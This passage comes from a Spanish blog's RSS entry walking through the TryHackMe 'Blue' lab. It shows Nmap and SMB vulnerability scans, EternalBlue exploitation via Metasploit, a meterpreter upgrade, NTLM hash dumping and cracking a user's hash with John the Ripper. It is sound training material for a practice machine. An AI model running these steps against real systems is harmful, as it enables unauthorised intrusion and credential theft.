      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Emitir paquetes no más lentos que &amp;lt;valor&amp;gt; por segundo&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, para obtener mayor información por consola&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 135,139,445,3389,49152,49153,49154,49158,49160 &amp;lt;dirección IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Scripts básicos de enumeración&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Versión y servicios que corren bajo los puertos encontrados&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;¿Cuántos puertos están abiertos con un número de puerto inferior a 1000?&lt;/li&gt;
  &lt;li&gt;¿A qué es vulnerable esta máquina?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Estas preguntas son bastante fáciles de responder si realizamos un buen escaneo con &lt;em&gt;Nmap&lt;/em&gt;. Para responder a la primera pregunta no hay donde perderse, bastará con introducir cuántos puertos abiertos, inferiores a 1000, hemos detectado con nuestro escaneo; recordemos que existen en total 65535 puertos posibles. Para responder a la segunda pregunta, tendremos que realizar un escaneo adicional, ya que se nos pregunta, a que ataque es vulnerable la máquina; a modo de pista, la plataforma nos da un ejemplo de respuesta: &lt;em&gt;ms08-067&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Si recordamos, lo más relevante que encontramos con nuestro escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;, es el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;445&lt;/code&gt;, o protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; (Server Message Block).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De modo que procederemos a utilizar los scripts específicos con los que cuenta &lt;em&gt;Nmap&lt;/em&gt;, para detectar vulnerabilidades en dicho protocolo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/3.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para poder utilizarlos podemos hacer lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;smb-vuln*&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 445 &amp;lt;dirección IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de vulnerabilidades del protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;--script&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Proporcionamos el script que queremos emplear; en este caso, como no teníamos un script en particular a utilizar, a través de expresiones regulares, indicamos que queremos utilizar todos aquellos scripts que comiencen por &lt;em&gt;smb-vuln&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos a que puertos queremos aplicar este escaneo&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos darnos cuenta, esta máquina es vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS17-010&lt;/code&gt;, o también conocido como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EternalBlue&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;

&lt;p&gt;Para esta segunda fase, &lt;em&gt;TryHackMe&lt;/em&gt; realiza la fase de explotación con el uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Metasploit&lt;/code&gt;, no obstante, no recomiendo acostumbrarse a utilizar herramientas automatizadas, ya que perdemos bastante el control sobre lo que está pasando por detrás, de modo que no aprendemos; sin embargo, en esta máquina en concreto, no es posible realizar un procedimiento manual, ya que la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Blue&lt;/code&gt;, está pensada para ser explotada mediante el uso de &lt;em&gt;Metasploit&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Para hacer uso de &lt;em&gt;Metasploit&lt;/em&gt; tendremos que abrir la aplicación, para ello haremos lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfconsole
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hemos abierto &lt;em&gt;Metasploit&lt;/em&gt;, procederemos a buscar aquello que queremos explotar, en este caso, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS17-010&lt;/code&gt;, o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EternalBlue&lt;/code&gt;, cualquiera de las dos formas es válida.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;search eternalblue
search ms17-010
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Posteriormente elegiremos el &lt;em&gt;exploit&lt;/em&gt; a utilizar; de hecho, una de las preguntas de la plataforma justamente es, introducir el &lt;em&gt;exploit&lt;/em&gt; que vamos a utilizar.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/windows/smb/ms17_010_eternalblue
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hemos seleccionado el &lt;em&gt;exploit&lt;/em&gt;, procederemos a configurar tanto el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LHOST&lt;/code&gt; como el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RHOST&lt;/code&gt;, que, dicho de otra forma, procederemos a introducir nuestra &lt;em&gt;IP&lt;/em&gt;, y la &lt;em&gt;IP&lt;/em&gt; de la máquina víctima.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;show options
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set LHOST &amp;lt;nuestra IP&amp;gt; 
set RHOST &amp;lt;IP víctima&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hemos configurado dichos parámetros, bastará con empezar con el ataque, consiguiéndonos &lt;em&gt;Metasploit&lt;/em&gt; una shell dentro de la máquina víctima.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez llegados a este punto, &lt;em&gt;TryHackMe&lt;/em&gt; nos pide convertir nuestra shell actual, en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt;, para ello tendremos que abandonar nuestra sesión actual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + Z&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Una vez fuera, tendremos que nuevamente buscar dentro de &lt;em&gt;Metasploit&lt;/em&gt;, un módulo que nos permita pasar de una shell a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;search shell_to_meterpreter
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hemos encontrado un módulo que nos sirva, tendremos que utilizarlo.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use post/multi/manage/shell_to_meterpreter
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y al igual que antes, tendremos que configurar cierto parámetro para poder conseguir un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt;, en este caso, la sesión con la que estábamos trabajando antes.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;show options
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions
set SESSION 1
run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La opción &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sessions&lt;/code&gt; nos permite listar todas las sesiones que tengamos activas; esto es útil si tenemos más de una sesión activa, y necesitamos indicar una en particular.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hemos conseguido un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt;, podemos volver a nuestra sesión.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;escalada-de-privilegios&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Escalada De Privilegios&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;TryHackMe&lt;/em&gt; nos indica que a través del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;migrate &amp;lt;ID del proceso&amp;gt;&lt;/code&gt;, podemos convertirnos en el usuario que está corriendo dicho proceso, sin embargo, esto no tiene ningún sentido ya que somos de hecho un usuario con máximos privilegios, somos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;, de modo que no tiene sentido migrar al usuario que ya somos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Antes de pasar a conseguir las flags de la máquina, la plataforma nos sigue enseñando comandos útiles de &lt;em&gt;Metasploit&lt;/em&gt;, en este caso el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashdump&lt;/code&gt;, con el cual podemos listar todos los usuarios del sistema, así como sus contraseñas &lt;em&gt;hasheadas&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En esta fase se nos pregunta por el nombre del usuario no predeterminado, es decir, aquel usuario que no sea &lt;em&gt;Guest&lt;/em&gt;, o &lt;em&gt;Administrator&lt;/em&gt;; finalmente, se nos pide &lt;em&gt;crackear&lt;/em&gt; la contraseña de este usuario, para ello utilizaremos la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John the Ripper&lt;/code&gt;, en conjunto del diccionario &lt;a href=&quot;https://github.com/brannondorsey/naive-hashcat/releases/tag/data&quot;&gt;rockyou.txt&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;En caso de no contar con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John the Ripper&lt;/code&gt; instalada, podemos hacer lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install john
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En nuestra máquina, crearemos un documento de texto que contenga la contraseña &lt;em&gt;hasheada&lt;/em&gt; del usuario, podemos hacerlo de manera manual, o desde la misma terminal:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez creado el archivo de texto, podemos pasar a &lt;em&gt;crackear&lt;/em&gt; la contraseña:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo john --format=NT --wordlist=/ruta/del/diccionario/rockyou.txt hash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hemos &lt;em&gt;crackeado&lt;/em&gt; la contraseña que se nos solicitaba, podemos ahora si, pasar a buscar las respectivas flags. En este caso existe un total de 3 flags, las cuales, según indica la plataforma, están escondidas en ubicaciones claves de un sistema &lt;em&gt;Windows&lt;/em&gt;, por lo que es aconsejable aprender estas locaciones.&lt;/p&gt;

&lt;p&gt;La primera flag dice que se encuentra en la raíz del sistema, dicho de otra forma, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Disco Local C&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para poder navegar dentro de la máquina víctima, podríamos usar el mismo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt;, sin embargo, en este caso nos manejaremos a través de una shell, para ello ejecutaremos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell&lt;/code&gt;. Una vez hecho esto, podemos ir hacia el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\\&lt;/code&gt;, listar su contenido y encontrar la flag.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd C:\\
dir
type flag1.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La segunda flag dice que se encuentra en una ubicación donde se almacenan las contraseñas dentro de Windows, dicho de otra forma, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\System32\Config&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd C:\Windows\System32\Config
dir
type flag2.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La última flag dice que se encuentra en una ubicación donde los administradores suelen tener guardadas cosas “bastante interesantes”, personalmente no tengo idea de donde podría ser esta ubicación así que procederemos a buscar el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag3.txt&lt;/code&gt;, dentro de todo el sistema, para ello tendremos que ir a la raíz del sistema, y empezar a buscar desde ahí:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd \
dir flag3.txt /s /p 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dudo mucho que los administradores guarden archivos importantes en una ubicación así, no obstante, es la plataforma la que nos comenta esto, y además, es aquí donde se encuentra la tercera y última flag, de modo que nos dirigiremos a esa ubicación para leer la flag.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd C:\Users\Jon\Documents
dir  
type flag3.txt  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-11-15-Blue-TryHackMe/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 15 Nov 2021 00:00:00 -0500</pubDate>
        <link>/es/Blue-TryHackMe/</link>
        <guid isPermaLink="true">/es/Blue-TryHackMe/</guid>
      </item>
    
  </channel>
</rss>
